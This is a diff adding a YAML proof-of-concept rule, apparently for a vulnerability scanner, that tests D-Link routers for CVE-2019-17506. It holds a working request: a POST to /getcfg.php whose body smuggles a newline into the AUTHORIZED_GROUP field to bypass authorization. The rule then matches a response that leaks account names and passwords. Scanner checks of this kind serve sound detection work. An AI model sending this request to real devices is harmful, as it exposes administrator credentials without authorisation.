@@ -1,0 +1,20 @@
+detail:
+  author: l1nk3r,Huasir(https://github.com/dahua966/)
+  links:
+  - https://xz.aliyun.com/t/6453
+expression: r0()
+manual: true
+name: poc-yaml-dlink-cve-2019-17506
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("xml") &&
+      response.body.bcontains(b"<name>") && response.body.bcontains(b"<password>")
+    request:
+      body: SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /getcfg.php
+transport: http
